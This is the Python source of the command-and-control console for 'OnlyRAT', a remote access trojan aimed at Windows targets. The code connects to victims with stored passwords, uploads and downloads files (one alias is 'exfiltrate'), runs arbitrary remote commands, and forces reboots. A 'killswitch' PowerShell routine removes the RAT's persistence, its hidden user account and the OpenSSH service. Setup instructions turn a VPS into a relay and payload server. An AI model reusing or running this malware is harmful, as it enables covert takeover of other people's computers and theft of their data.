#!/usr/bin/python
# python console for OnlyRAT
# created by : C0SM0

# imports
import os
import sys
import getpass
from datetime import datetime

# banner for display
banner = """
                                                                     _;,
                                                 ,,=-,--,,__     _,-;:;;},,,_    
            _,oo,         Ll                 _,##&&&&$$&&$$$&-=;%%^%&;v:&& @ `=,_   
          ,oO" `0}        Ll              ,%#####&#>&&$$$$&$$$&,&'$$#`"%%;,,,*%^<}  
      _,--O;_,  0_        Ll            ,%%%%%&%-#&###$$"$$$$$*;&&$,#;%^*%$$^{,%;'
   ,cC'oO`'CC  ,OnnNNNNn, Ll  YY,      ,%#&%%$$$$%%%%%##&&^$%^%&&&$$'&#,-%%--"'
  ,CCCO"   `C ,0`Nn`  `Nn Ll   YY,    ,;;##&,$$$$$$$;,%%%&&%%%&&&&&&$$%%'
  {CC{       ,0' NN    NN Ll    Yy  yY';#&,#,$$$$$%%%%%%%%&%%%&&&&&&%%`
  CCC(     _o0   NN    NN Ll     YyyY ,;&##&###%%$$%&&%%%%#^%^&&&&&%{`
 ,OCC{    ,0C    NN    NN Ll      YY   ;#&&#####&%;%&&,%%%%#%=%%%&^%%               
,O`'"Cc_.o0cC    NN    NN Ll y,   YY   ;&&&^##&&&$%&&&%%%"`     `%%%%               
o0    _o0"` '`   NN    NN Ll  Yy,yYY  '^%%&VGh%%%%%&&"^%_,,       "%%%,_      _,.,_  
0o,_,oo0"        NN    NN Ll   `YyY`    ``'"lIG9ubHkg,,""''`        ""%%>_,;VyIG5lZ;,   
"00O"`                                          ``'``""UkFUIHlvdSdsbCBldm;"       `"WQ=,

                 [::] The Only RAT You'll Ever Need [::]
                    [::] Created By : Blue Cosmo [::]
"""

# help menu
help_menu = """
        [+] Arguments:
            <username>.rat ------------ Access Target Via Config File
            -d, --dfig <vps_user> ----- Download RAT Config File 
            -s, --setup --------------- Setup VPS
            -m, --man ----------------- OnlyRAT Manual
            -v, --version ------------- OnlyRAT Version
            -u, --update -------------- Update OnlyRAT
            -r, --remove -------------- Uninstall OnlyRAT
            -h, --help  --------------- Help Menu

        [+] Example:
            onlyrat bluecosmo.rat
"""

# option menu
options_menu = """
        [+] Command and Control:
            [init] ------------------- Initialize new connection
            [orconsole] -------------- Remote Console
            [upload] ----------------- Upload Files to Target PC
            [download] --------------- Download Files from Target PC
            [set connection local] --- Sets Connection to Local
            [set connection remote] -- Sets Connection to Remote
            [restart] ---------------- Restart Target PC
            [shutdown] --------------- Shutdown Target PC
            [killswitch] ------------- Removes OnlyRAT From Target

        [+] Payloads:
            Coming Soon...

        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Onlyrat Manual
            [config] ----------------- Display RAT File
            [version] ---------------- Version Number
            [update] ----------------- Update OnlyRAT
            [uninstall] -------------- Uninstall OnlyRAT
            [quit] ------------------- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...
"""

username = getpass.getuser() # gets username
header = f"[~] {username}@onlyrat $ " # sets up user input interface
remote_path = "raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main" # url path for OnlyRAT files
local_path = f"/home/{username}/.MK01-OnlyRAT" if username != "root" else "/root/.MK01-OnlyRAT" # gets path of OnlyRAT

# read config file
def read_config(config_file):
    # get file contents
    read_lines = open(config_file, "r").readlines()

    configuration = {"IPADDRESS": read_lines[0].strip()}
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = (read_lines[2]).replace("\\", "/").strip()
    configuration["STARTUPDIRECTORY"] = (read_lines[3]).replace("\\", "/").strip()
    configuration["REMOTEHOST"] = read_lines[4].strip()
    configuration["PORT"] = read_lines[5].strip()
    configuration["CONNECT"] = read_lines[6].strip()

    return configuration

# display configuration file data
def print_config(configuration):

    for key, value in configuration.items():
        print(f"{key} : {value}")

# clear screen
def clear():
    os.system("clear")

# terminates program
def exit():
    print("\n[*] Exiting...")
    sys.exit()

# gets current date and time
def current_date():
    current = datetime.now()    

    return current.strftime("%m-%d-%Y_%H-%M-%S")

# edit connection type
def edit_connection(rat_file, connection):

    # get current configuration
    lines = open(rat_file, "r").readlines()

    # add new connection type
    lines[6] = connection

    # rewrite configuration file
    with open(rat_file, "w") as rat:
        for line in lines:
            rat.write(line)

# connects rat to target
def connect(address, password, port):
    print("\n [*] Connecting to target...")

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port}")

# remote uploads with SCP
def remote_upload(address, password, upload, path, port):

    print("\n[*] Starting Upload...")

    # scp upload
    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} onlyrat@{address}:{path}")

    print("[+] Upload complete\n")

# remote download with SCP
def remote_download(address, password, path, port):

    print("\n[*] Starting Download...")

    # scp download
    os.system("mkdir ~/Downloads")

    os.system(f"sshpass -p \"{password}\" scp -P {port} onlyrat@{address}:{path} ~/Downloads")

    print("[+] Download saved to \"~/Downloads\"\n")

# run commands remotely with SCP
def remote_command(address, password, command, port):

    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port} '{command}'")

# killswitch
def killswitch(address, password, working, username, port):
    print("\n[*] Prepping killswitch...")
    # web requests
    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
    print("[+] Killswitch prepped")

    # installing killswitch
    print("[*] Executing killswitch...")
    remote_command(address, password, f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del *.cmd", port)
    remote_command(address, password, killswitch_command, port)
    print("[+] Killswitch Executed sucessfully\n")
       
    # execute logger
    print("\n[*] Restarting target computer...")

# custom upload
def upload(address, password, working, port):
    # get upload file
    print("\n[~] Enter file you wish to upload :")
    upload_file = input(header)

    # upload file
    print("\n[*] Uploading...")
    remote_upload(address, password, upload_file, working, port)
    print(f"[+] Uploaded sucessfully to \"{working}\"\n")

# custom download
def download(address, password, port):

    # get download path
    print("\n[~] Enter path of file you wish to download :")
    download_file = input(header)

    # download file
    print("\n[*] Downloading...")
    remote_download(address, password, download_file, port)

# update OnlyRAT
def update():

    print("\n[*] Checking for updates...")

    # get latest version nubmer
    os.system("curl https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")

    # save version nubmers to memory
    current_version = float(open(f"{local_path}/version.txt", "r").read())
    latest_version = float(open(f"{local_path}/latest.txt", "r").read())

    # remove version number file
    os.system("rm -rf ~/.MK01-OnlyRAT/latest.txt")

    # if new version is available, update
    if latest_version > current_version:
        print("\n[+] Update found")
        print("[~] Update Onlyrat? [y/n]\n")

        # user input, option
        option = input(f"{header}")

        # update
        if option == "y":
            os.system("bash ~/.MK01-OnlyRAT/payloads/update.sh")

            # exception
            # else:
            #     main()

    else:
        print("\n[+] OnlyRAT already up to date")
        print("[*] Hit any key to continue...\n")
        input(header)
        #main()

# uninstalls onlyrat
def remove():
    # confirmation
    print("\n[~] Are you sure you want to remove OnlyRAT [y/n]\n")

    # user input
    option = input(header)

    # delete OnlyRAT
    if option == "y":
        os.system("rm -rf ~/.MK01-OnlyRAT")
        os.system("sudo rm /usr/local/bin/onlyrat")

    # cancel
    if option == "n":
        main()

# download configuration file
def download_config():
    user = parameters("[~] What is the VPS User? : ")
    address = parameters("[~] What is the VPS IP Address? : ")
    port = parameters("[~] What is the VPS Port? : ")
    # format vps
    vps = f"{user}@{address}"

    # confirm values
    print("[~] Is The Following Correct? : [y/n]")
    confirm = parameters(vps)
    # if yes
    if confirm in ["y", "yes"]:
        print("[*] Downloading configuration...")
        os.system(f"scp -P {port} {vps}:/home/{user}/*.rat .")

    elif confirm in ["n", "no"]:
        download_config()

    else:
        print("[!!] Value Not Recognized")

def parameters(arg0):
    # user input, address
    print(arg0)
    result = input(header)
    print()

    return result

def vps_parameters(port, vps, user):
    # ssh vps settings
    print("""
            [!] READ ALL INSTRUCTIONS CAREFULLY

            [+] Setting up VPS
            
            [1] set up the VPS and edit the ssh file

                sudo nano /etc/ssh/sshd_config 
            
            [2] change the following, remove "#"

                AllowTcpForwarding yes
                GatewayPorts yes 

            [3] save changes and restart ssh

                sudo service ssh restart

            [*] Creating Our SSH Key...
                - set filename as "key"
                - set NO PASSWORD
            """)

    # creating ssh key
    os.system("ssh-keygen")
    os.system("chmod 600 key")
    os.system(f"ssh-copy-id -i key -p {port} {vps}")

    # confirmation
    print(f"""
            [+] The Key Has Been Generated

            [*] To Test It, You Can Run:
                ssh {vps} -i key
            
            [*] Uploading SSH Key to VPS...
            """)

    # upload ssh key to vps
    os.system(f"scp -P {port} -r key {vps}:/home/{user}")

    # final vps settings
    print("""
            [+] The Key Has Been Uploaded
                - You may need to move the key to '/var/www/html' 
                if you plan to use apache2 for your webserver

            [4] Make Your Key Readable
                
                chmod +r key

            [5] Add OnlyRAT to Web Server

                git clone https://github.com/CosmodiumCS/mk01-onlyrat.git

            [6] On Line 2 of '/installers/from-vps.cmd', 
                Add Your VPS IP Address

            [7] On Line 2 of '/payloads/v1.cmd', 
                Add Your VPS IP Address 

            [8] On Lines 3-5 of '/payloads/v2.ps1', 
                Fill in The Appropiate Values 

            [9] Start Web Server

                python3 -http.server 80
                # or
                sudo service start apache2

            [+] Congrats! You are all set up!
            """)

# setup vps
def setup_vps():
    user = parameters("[~] What is the VPS User? : ")
    address = parameters("[~] What is the VPS IP Address? : ")
    port = parameters("[~] What is the VPS Port? : ")
    # format vps
    vps = f"{user}@{address}"

    # confirm values
    print("[~] Is The Following Correct? : [y/n]")
    print(f"{vps} -p {port}")
    confirm = input(header)
    print()

    # if yes
    if confirm in ["y", "yes"]:
        vps_parameters(port, vps, user)
    elif confirm in ["n", "no"]:
        setup_vps()

    else:
        print("[!!] Value Not Recognized")

# command line interface
def cli(arguments):
    # display banner
    clear()

    print(banner)

    # if arguments exist
    if arguments:

        argument = sys.argv[1]

        if argument.endswith(".rat"):
            print("\t[~] Type \"help\" for help menu :\n")

            # loop user input
            while True:
                # user input, option
                option = input(header)
                rat_file = argument

                # check if configuration file exists
                try:
                    configuration = read_config(rat_file)

                except FileNotFoundError: 
                    print("\n[!!] File does not exist")
                    exit()

                # get config info
                local_host = configuration.get("IPADDRESS")
                password = configuration.get("PASSWORD")
                working_direcory = configuration.get("WORKINGDIRECTORY")
                startup_direcory = configuration.get("STARTUPDIRECTORY")
                remote_host = configuration.get("REMOTEHOST")
                remote_port = configuration.get("PORT")
                connection_type = configuration.get("CONNECT")
                target_username = working_direcory[9:-19]

                # get current connection type
                ipv4 = remote_host if connection_type == "remote" else local_host
                port = remote_port if connection_type == "remote" else "22"

                # remote console
                if option == "orconsole":
                    connect(ipv4, password, port)

                elif option == "fix orconsole" or option == "init":
                    os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password} {port}")

                elif option == "set connection local":
                    edit_connection(rat_file, "local")

                elif option == "set connection remote":
                    edit_connection(rat_file, "remote")

                elif option == "upload":
                    upload(ipv4, password, working_direcory, port)

                elif option in ["download", "exfiltrate"]:
                    download(ipv4, password, port)

                elif option == "restart":
                    remote_command(ipv4, password, "shutdown /r", port)

                elif option == "shutdown":
                    remote_command(ipv4, password, "shutdown", port)

                elif option == "help":
                    print(banner)
                    print(options_menu)

                elif option == "config":
                    print_config(configuration)
                    print(f"USERNAME : {target_username}")

                elif option == "version":
                    os.system(f"cat {local_path}/version.txt")

                elif option == "update":
                    update()
                    exit()

                elif option == "killswitch":
                    print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
                    confirm = input(header)
                    if confirm == "y":
                        killswitch(ipv4, password, working_direcory, target_username, port)

                    else:
                        main()

                elif option in ["man", "manual"]:
                    os.system("xdg-open https://github.com/CosmodiumCS/MK01-OnlyRAT/blob/main/payloads/manual.md")

                elif option in ["remove", "uninstall"]:
                    remove()

                elif option in ["quit", "exit"]:
                    exit()

                else:
                    os.system(option)

                # new line for cleaner UI
                print("\n")

        elif argument in ["--dfig", "-d", "--download"]:
            download_config()

        elif argument in ["--setup", "-s"]:
            setup_vps()

        elif argument in ["--manual", "-m", "--man"]:
            os.system("xdg-open https://github.com/CosmodiumCS/MK01-OnlyRAT/blob/main/payloads/manual.md")

        elif argument in ["--version", "-v"]:
            os.system(f"cat {local_path}/version.txt")

        elif argument in ["--update", "-u"]:
            update()
            exit()

        elif argument in ["--remove", "-r", "--uninstall"]: 
            remove()

        elif argument in ["--help", "-h"]:
            print(help_menu)

        else:
            print("[!!] Argument Not Recognized")

    else:
        print(help_menu)

# main code
def main():
    
    # clear screen
    clear()

    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()
